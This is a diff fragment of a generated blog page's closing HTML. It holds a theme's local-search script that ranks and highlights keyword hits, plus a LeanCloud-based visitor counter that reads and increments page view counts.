+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("EdyobKaxPz3ofLTPlxfLIN1V-gzGzoHsz", "3hpzfKGL11zsIHV0ONyWgUgW");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
